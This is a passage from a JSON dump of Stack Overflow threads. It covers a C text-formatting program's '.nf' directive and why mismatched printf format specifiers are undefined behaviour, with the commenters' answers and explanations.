{\n            margin = 0;\n            if ( center) {\n                margin = WIDTH - ( ( WIDTH - strlen ( line)) / 2);\n                center--;\n            }\n            printf ( \"%*s\\n\", margin, line);\n            strcpy ( line, word);\n            out = 1;\n        }\n    }\n    if ( !out) {\n        margin = 0;\n        if ( center) {\n            margin = ( WIDTH - strlen ( line)) / 2;\n            center--;\n        }\n        printf ( \"%*s\\n\", margin, line);\n    }\n\n    fclose ( fp);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "accepted_answer_id": 33650570, "answer_count": 2, "score": 0, "last_activity_date": 1447253395, "creation_date": 1447241079, "last_edit_date": 1447243363, "question_id": 33649520, "link": "https://stackoverflow.com/questions/33649520/how-to-implement-nf-formatting-feature", "title": "How to implement `.nf` formatting feature", "body": "<p>I have written a program that reads a text file inputted by the user, and inside the file contains formatting features such as <code>.br</code> , <code>.sp</code> and <code>.nf</code>.</p>\n\n<p><code>.nf</code> symbolises no fill, also meaning that when you see any formatting feature after <code>.nf</code> they should all be ignored and it should just output the text in the format it originally appears in the text file.</p>\n\n<p>For example: </p>\n\n<pre><code>.nf Hello my name is .br Jay.\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Hello my name is Jay\n</code></pre>\n\n<p>If <code>.nf</code> was not there the output would be:</p>\n\n<pre><code>Hello my name is \nJay.\n</code></pre>\n\n<p>Here's my code:</p>\n\n<pre><code>int main(void) {\n    FILE *fp = NULL;\n    char file_name[257] = {'\\0'};\n    char line[61] = {'\\0'};\n    char word[61] = {'\\0'};\n    int out = 0;\n    int blanks;\n    int space;\n    int useFormats = 1;\n\n    printf ( \"Enter file name:\\n\");\n    scanf ( \" %256[^\\n]\", file_name);\n\n    if ( ( fp = fopen ( file_name, \"r\")) == NULL) {\n        printf ( \"could not open file\\n\");\n        return 1;\n    }\n    while (useFormats == 1){\n        while ( ( fscanf ( fp, \"%60s\", word)) == 1) { //breaks the sentence    after .br\n            if ( strcmp ( word, \".br\") == 0) {\n                printf ( \"%s\\n\", line);\n                line[0] = '\\0';\n                out = 1;\n            }\n\n            if ( strcmp ( word, \".nf\") == 0) {// stop filling lines (no fill)\n                useFormats == 0;\n                line[0] = '\\0';\n                out = 1;\n\n            }\n\n            if ( strncmp ( word, \".sp\", 3) == 0) { // creates n amount of spaces after .sp\n                if ( ( sscanf ( &amp;word[3], \"%d\", &amp;blanks)) == 1) {\n                    printf ( \"%s\\n\", line);\n                    while ( blanks) {\n                        blanks--;\n                        printf ( \"\\n\");\n                    }\n                    line[0] = '\\0';\n                    out = 1;\n                } \n                else {\n                    printf ( \"%s\\n\", line);\n                    line[0] = '\\0';\n                    out = 1;\n                }\n            }\n            else if ( strlen ( line) + strlen ( word) + 1 &lt; 60) {\n                strcat ( line, \" \");\n                strcat ( line, word);\n                out = 0;\n            }\n            else {\n                printf ( \"%s\\n\", line);\n                strcpy ( line, word);\n                out = 1;\n            }\n        }\n        if ( !out) {\n            printf ( \"%s\\n\", line);\n        }\n\n        fclose ( fp);\n        return 0;\n    }\n}\n</code></pre>\n\n<p>I tried creating a variable called <code>useFormats</code> which is true whilst running and I make it false when it reaches to the <code>.nf</code> feature but nothing happens. I'm not sure if I should remove the <code>if</code> statement and create another <code>while</code> loop to say <code>while (useFormats == 0)</code> to implement the <code>.nf</code> feature.</p>\n"}, {"tags": ["c++", "c", "printf", "undefined-behavior"], "comments": [{"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447237727, "post_id": 33648596, "comment_id": 55070589, "body": "@pmg also in C++? Anyway, I changed it to be a general floating point type."}, {"owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "edited": false, "score": 0, "creation_date": 1447237773, "post_id": 33648596, "comment_id": 55070623, "body": "Yes, <code>1.9</code> is always type <code>double</code>. Use <code>1.9f</code> if you want a <code>float</code>."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1447237787, "post_id": 33648596, "comment_id": 55070629, "body": "I&#39;m not really getting your question: <i>What are the specific dangers of mis-matching conversion specifiers and arguments in printf which make it UB?</i>. The danger is that you get undefined behaviour. Maybe a certain  mismatch always works in environnment A, but yields in UB in environnment B."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1447237871, "post_id": 33648596, "comment_id": 55070684, "body": "@MichaelWalz Joker. The committee hopefully only declares something UB if there is no good way to specify a behavior. Why is there none in this specific case? I.o.w I&#39;m looking for the <i>rationale</i> of that decree."}, {"owner": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "edited": false, "score": 2, "creation_date": 1447237891, "post_id": 33648596, "comment_id": 55070691, "body": "I&#39;m not sure I understand the question. C says it UB as C refuses to impose a specific behavior  for these cases."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "edited": false, "score": 0, "creation_date": 1447238025, "post_id": 33648596, "comment_id": 55070775, "body": "@ouah As far as I understand the standard could have said something like &quot;the resulting output of a call to printf is unspecified if a conversion specification does not match its corresponding argument&quot;. That would let the OP in the other post sleep better. Instead the committee made it overall UB, so that he must fear that his machine crashes. Why is there the danger of a crash?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1447238054, "post_id": 33648596, "comment_id": 55070788, "body": "@PeterSchneider what should <code>printf(&quot;%d&quot;, 1.9);</code> What is the &quot;expected wrong output&quot;."}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 0, "creation_date": 1447238088, "post_id": 33648596, "comment_id": 55070808, "body": "@PeterSchneider Because it is UB, so implementations can do whatever they like, for instance, to optimize the implementation of that function."}, {"owner": {"reputation": 142904, "user_id": 1708801, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/01b9a608af886840fcf05fcfd9b5dc27?s=128&d=identicon&r=PG", "display_name": "Shafik Yaghmour", "link": "https://stackoverflow.com/users/1708801/shafik-yaghmour"}, "edited": false, "score": 0, "creation_date": 1447238110, "post_id": 33648596, "comment_id": 55070820, "body": "Not sure I understand the downvotes, now on the other hand I am sure there is a duplicate of this someplace but the answer below is spot on and good."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1447238124, "post_id": 33648596, "comment_id": 55070828, "body": "@MichaelWalz An unspecified but finite sequence of characters would do. That is much more restrictive than general UB. Is the direction of my question really that hard to understand?"}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 0, "creation_date": 1447238216, "post_id": 33648596, "comment_id": 55070876, "body": "@juanchopanza Yes, and in which specific way could that do any harm beyond wrong output?"}, {"owner": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 0, "creation_date": 1447238276, "post_id": 33648596, "comment_id": 55070908, "body": "@PeterSchneider: In what cases would &quot;wrong output&quot; be even remotely acceptable?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1447238278, "post_id": 33648596, "comment_id": 55070911, "body": "@PeterSchneider the answer provided by Jonathan Wakely seems pretty clear."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 0, "creation_date": 1447239097, "post_id": 33648596, "comment_id": 55071363, "body": "@MichaelFoukarakis I can make many errors in a program which are errors but not UB. They may be unacceptable in the application domain (because I want an <i>accurate</i> account balance) but still don&#39;t crash the program or, worse, corrupt unrelated information (for example, <i>your</i> account balance). That distinction seems essential to me. I was curious what could go wrong with a bad conversion specifier, beyond wrong output."}, {"owner": {"reputation": 35543, "user_id": 149530, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9b6c8b04130af49735de5be666d67c00?s=128&d=identicon&r=PG", "display_name": "Michael Foukarakis", "link": "https://stackoverflow.com/users/149530/michael-foukarakis"}, "edited": false, "score": 2, "creation_date": 1447239597, "post_id": 33648596, "comment_id": 55071635, "body": "The list of things that can go wrong if you treat one piece of typed data as something it is not is probably endless."}, {"owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "edited": false, "score": 0, "creation_date": 1447240937, "post_id": 33648596, "comment_id": 55072345, "body": "And if the standard specified that incorrect format specifiers result in unspecified (but not undefined) behaviour, should it also try to make it OK to use more format specifiers than arguments? Or it&#39;s OK to pass non-pointers where <code>%s</code> is used? The standard doesn&#39;t try to do any of that, it just says it&#39;s your job to use it correctly."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1447252733, "post_id": 33648596, "comment_id": 55078948, "body": "Is it better that an incorrect program silently produces incorrect output, or that it crashes? If it crashes, it will get discarded or fixed... I don&#39;t see why the standard should attempt to prevent incorrect programs from crashing. The programmer should ensure that their format strings and argument datatypes agree, and a good compiler will help by producing warnings."}], "answers": [{"comments": [{"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 1, "creation_date": 1447238268, "post_id": 33648687, "comment_id": 55070903, "body": "I am curious which architecture would do this, as vararg functions typically pass arguments in stack and not in registers."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "reply_to_user": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1447238397, "post_id": 33648687, "comment_id": 55070992, "body": "@user694733 My thinking. The general implementation will not be able to do anything else. Now there could conceivably be a  2-arg built-in override  printf for specific types but I doubt that an implementation would optimize there; it&#39;s I/O, for heavens sake. Still, interesting idea."}, {"owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "edited": false, "score": 1, "creation_date": 1447238496, "post_id": 33648687, "comment_id": 55071039, "body": "The compiler is free to expand <code>printf</code> to an intrinsic, or inline it, because it&#39;s a standard function so its behaviour is precisely defined. If that happens there is no guarantee that it uses varargs."}, {"owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "edited": false, "score": 2, "creation_date": 1447240612, "post_id": 33648687, "comment_id": 55072185, "body": "Even if the arguments are written to the stack for use with <code>va_list</code>, reading a value as the wrong type could abort, because the bit pattern of the integer <code>1</code> (for example) could be a trap representation for a pointer."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 2, "creation_date": 1447317003, "post_id": 33648687, "comment_id": 55107321, "body": "Here is an example that &#39;may&#39; result in a seg fault event:  printf( &quot;%s\\n&quot;, floatValue);  as a simple example, for sure either the &#39;address&#39; that printf() sees would be &#39;any place in memory.  resulting in accessing memory that is not available to the program or print() follows that &#39;pointer&#39; and starts printing characters from stack or heap it until is encounters a NUL char.  Either case is undefined behaviour"}], "tags": [], "owner": {"reputation": 152528, "user_id": 981959, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04798ba8ef6591a9c23c5868dc0bf664?s=128&d=identicon&r=PG", "display_name": "Jonathan Wakely", "link": "https://stackoverflow.com/users/981959/jonathan-wakely"}, "is_accepted": false, "score": 11, "last_activity_date": 1447237942, "creation_date": 1447237942, "answer_id": 33648687, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine/33648687#33648687", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p><code>printf</code> only works as described by the standard if you use it correctly. If you use it incorrectly, the behaviour is undefined. Why should the standard define what happens when you use it wrong?</p>\n\n<p>Concretely, on some architectures floating point arguments are passed in different registers to integer arguments, so inside <code>printf</code> when it tries to find an <code>int</code> matching the format specifier it will find garbage in the corresponding register. Since those details are outside the scope of the standard there is no way to deal with that kind of misbehaviour except to say it's undefined.</p>\n\n<p>For an example of how badly it could go wrong, using a format specifier of <code>\"%p\"</code> but passing a floating point type could mean that <code>printf</code> tries to read a pointer from a register or stack location which hasn't been set to a valid value and could contain a trap representation, which would cause the program to abort.</p>\n"}, {"comments": [{"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447240384, "post_id": 33649198, "comment_id": 55072079, "body": "Well, as discussed above it&#39;s fairly far-fetched for varargs; but of course Jonathan&#39;s intrinsic/inlining concept probably is reason enough to principally consider it."}], "tags": [], "owner": {"reputation": 15520, "user_id": 428857, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/J477b.png?s=128&g=1", "display_name": "TonyK", "link": "https://stackoverflow.com/users/428857/tonyk"}, "is_accepted": false, "score": 3, "last_activity_date": 1447239813, "creation_date": 1447239813, "answer_id": 33649198, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine/33649198#33649198", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p>Just to take your example: suppose that your architecture's procedure call standard says that floating-point arguments are passed in floating-point registers. But <code>printf</code> thinks you are passing an integer, because of the <code>%d</code> format specifier. So it expects an argument on the call stack, which isn't there. Now anything can happen.</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 3, "last_activity_date": 1447240944, "last_edit_date": 1447240944, "creation_date": 1447240749, "answer_id": 33649437, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine/33649437#33649437", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p>Any <code>printf</code> format/argument mismatch will cause erroneous output, so you cannot rely on anything once you do that.  It is hard to tell which will have dire consequences beyond garbage output because it depends completely no the specifics of the platform you are compiling for and the actual details of the <code>printf</code> implementation.</p>\n\n<p>Passing invalid arguments to a <code>printf</code> instance that has a <code>%s</code> format can cause invalid pointers to be dereferenced.  But invalid arguments for <em>simpler</em> types such as <code>int</code> or <code>double</code> can cause alignment errors with similar consequences.</p>\n"}, {"comments": [{"owner": {"reputation": 1180, "user_id": 10992795, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cdab9cc149df47abb7c4627a56c940f3?s=128&d=identicon&r=PG&f=1", "display_name": "numzero", "link": "https://stackoverflow.com/users/10992795/numzero"}, "edited": false, "score": 1, "creation_date": 1585444892, "post_id": 33652193, "comment_id": 107761289, "body": "There is another possibility: the compiler may try to outsmart you and just fix the specifier (esp. if inlining). UB allows that too."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user539810"}, "is_accepted": false, "score": 2, "last_activity_date": 1447250522, "creation_date": 1447250522, "answer_id": 33652193, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine/33652193#33652193", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p>I'll start by asking you to be aware of the fact that <code>long</code> is 64-bit for 64-bit versions of OS X, Linux, the BSD clones, and various Unix flavors if you aren't already aware. 64-bit Windows, however, kept <code>long</code> as 32-bit.</p>\n\n<p>What does this have to do with <code>printf()</code> and UB with respect to its conversion specifications?</p>\n\n<p>Internally, <code>printf()</code> will use the <code>va_arg()</code> macro. If you use <code>%ld</code> on 64-bit Linux and only pass an <code>int</code>, the other 32 bits will be retrieved from adjacent memory. If you use <code>%d</code> and pass a <code>long</code> on 64-bit Linux, the other 32 bits will still be on the argument stack. In other words, the conversion specification indicates the type (<code>int</code>, <code>long</code>, whatever) to <code>va_arg()</code>, and the size of the corresponding type determines the number of bytes by which <code>va_arg()</code> adjusts its argument pointer. Whereas it will just work on Windows since <code>sizeof(int)==sizeof(long)</code>, porting it to another 64-bit platform can cause trouble, especially when you have a <code>int *nptr;</code> and try to use <code>%ld</code> with <code>*nptr</code>. If you don't have access to the adjacent memory, you'll likely get a segfault. So the possible concrete cases are:</p>\n\n<ul>\n<li>adjacent memory is read, and output is messed up from that point on</li>\n<li>adjacent memory is attempted to be read, and there's a segfault due to a protection mechanism</li>\n<li>the size of <code>long</code> and <code>int</code> are the same, so it just works</li>\n<li>the value fetched is truncated, and output is messed up from that point on</li>\n</ul>\n\n<p>I'm not sure if alignment is an issue on some platforms, but if it is, it would depend upon the implementation of passing function parameters. Some \"intelligent\" compiler-specific <code>printf()</code> with a short argument list might bypass <code>va_arg()</code> altogether and represent the passed data as a string of bytes rather than working with a stack. If that happened, <code>printf(\"%x %lx\\n\", LONG_MAX, INT_MIN);</code> has three possibilities:</p>\n\n<ul>\n<li>the size of <code>long</code> and <code>int</code> are the same, so it just works</li>\n<li><code>ffffffff ffffffff80000000</code> is printed</li>\n<li>the program crashes due to an alignment fault</li>\n</ul>\n\n<p>As for why the C standard says that it causes undefined behavior, it doesn't specify exactly how <code>va_arg()</code> works, how function parameters are passed and represented in memory, or the explicit sizes of <code>int</code>, <code>long</code>, or other primitive data types because it doesn't unnecessarily constrain implementations. As a result, whatever happens is something the C standard cannot predict. Just looking at the examples above should be an indication of that fact, and I can't imagine what else other implementations exist that might behave differently altogether.</p>\n"}, {"tags": [], "owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "is_accepted": true, "score": 3, "last_activity_date": 1447274800, "creation_date": 1447274800, "answer_id": 33659529, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine/33659529#33659529", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p>Some compilers may implement variable-format arguments in a way that allows the\ntypes of arguments to be validated; since having a program trap on incorrect\nusage may be better than possibly having it output seemingly-valid-but-wrong\ninformation, some platforms may choose to do that.</p>\n\n<p>Because the behavior of traps is outside the realm of the C Standard, any action\nwhich might plausibly trap is classified as invoking Undefined Behavior.</p>\n\n<p>Note that the possibility of implementations trapping based on incorrect formatting means that behavior is considered undefined even in cases where the expected type and the actual passed type have the same representation, except that signed and unsigned numbers of the same rank are interchangeable if the values they hold are within the range which is common to both [i.e. if a \"long\" holds 23, it may be output with \"%lX\" but not with \"%X\" even if \"int\" and \"long\" are the same size].</p>\n\n<p>Note also that the C89 committee introduced a rule by fiat, which remains to this day, which states that even if \"int\" and \"long\" have the same format, the code:</p>\n\n<pre><code>long foo=23;\nint *u = &amp;foo;\n(*u)++;\n</code></pre>\n\n<p>invokes Undefined Behavior since it causes information which was written as type \"long\" to be read as type \"int\" (behavior would also be Undefined if it was type \"unsigned int\").  Since a \"%X\" format specifier would cause data to be read as type \"unsigned int\", passing the data as type \"long\" would almost certainly cause the data to be stored somewhere as \"long\" but subsequently read as type \"unsigned int\", such behavior would almost likely violate the aforementioned rule.</p>\n"}], "owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2175, "favorite_count": 4, "accepted_answer_id": 33659529, "answer_count": 5, "score": 3, "last_activity_date": 1447274800, "creation_date": 1447237626, "last_edit_date": 1495539863, "question_id": 33648596, "link": "https://stackoverflow.com/questions/33648596/why-are-arguments-which-do-not-match-the-conversion-specifier-in-printf-undefine", "title": "Why are arguments which do not match the conversion specifier in printf undefined behavior?", "body": "<p>In both C (n1570 7.21.6.1/10) and C++ (by inclusion of the C standard library) it is undefined behavior to provide an argument to printf whose type does not match its conversion specification. A simple example:</p>\n\n<pre><code>printf(\"%d\", 1.9)\n</code></pre>\n\n<p>The format string specifies an int, while the argument is a floating point type. </p>\n\n<p>This question is inspired by the question of a user who encountered legacy code with an abundance of conversion mismatches which apparently did no harm, cf. <a href=\"https://stackoverflow.com/q/33647458/3150802\">undefined behaviour in theory and in practice</a>.</p>\n\n<p>Declaring a mere format mismatch UB seems drastic at first. It is clear that the <em>output</em> can be wrong, depending on things like the exact mismatch, argument types, endianness, possibly stack layout and other issues. This extends, as one commentator there pointed out, also to subsequent (or even previous?) arguments. But that is far from general UB. Personally, I never encountered anything else but the expected wrong output.</p>\n\n<p>To venture a guess, I would exclude alignment issues. What I can imagine is that providing a format string which makes printf expect large data together with small actual arguments possibly lets <code>printf</code> read beyond the stack, but I lack deeper insight in the var args mechanism and specific printf implementation details to verify that. </p>\n\n<p>I had a quick look at the <a href=\"https://sourceware.org/git/?p=glibc.git;a=blob;f=stdio-common/vfprintf.c;h=fc370e8cbc4e9652a2ed377b1c6f2324f15b1bf9;hb=3321010338384ecdc6633a8b032bb0ed6aa9b19a\" rel=\"nofollow noreferrer\">printf sources</a>, but they are pretty opaque to the casual reader. </p>\n\n<p>Therefore my question: What are the specific dangers of mis-matching conversion specifiers and arguments in <code>printf</code> which make it UB?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 91305, "user_id": 19410, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/175f1d55c73ce5cb1d071dc4d0f1a333?s=128&d=identicon&r=PG", "display_name": "Alex Reynolds", "link": "https://stackoverflow.com/users/19410/alex-reynolds"}, "edited": false, "score": 1, "creation_date": 1447234922, "post_id": 33647766, "comment_id": 55068975, "body": "Your code compiles, but with warnings, because you leave out <code>include</code> statements. Compile with <code>-Wall</code> to turn on all warnings."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 1, "creation_date": 1447235006, "post_id": 33647766, "comment_id": 55069028, "body": "Thats erroneous code and not well formatted. You are missing  <code>#include</code> statements and the validity of <code>int main()</code> instead of <code>int main(void)</code> is implementation defined. Furthermore you miss a return for your function."}, {"owner": {"reputation": 91305, "user_id": 19410, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/175f1d55c73ce5cb1d071dc4d0f1a333?s=128&d=identicon&r=PG", "display_name": "Alex Reynolds", "link": "https://stackoverflow.com/users/19410/alex-reynolds"}, "edited": false, "score": 1, "creation_date": 1447235076, "post_id": 33647766, "comment_id": 55069072, "body": "You might define the main function as <code>int main(void)</code> or <code>int main(int argc, char* argv[])</code>, and add <code>#include &lt;stdio.h&gt;</code> to the top of your file."}, {"owner": {"reputation": 25, "user_id": 5549982, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/485d54a0e5fe04e205632445f268161e?s=128&d=identicon&r=PG&f=1", "display_name": "Basilm", "link": "https://stackoverflow.com/users/5549982/basilm"}, "edited": false, "score": 0, "creation_date": 1447235275, "post_id": 33647766, "comment_id": 55069185, "body": "I updated my code , I didn&#39;t include it all at first , excuse me."}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", 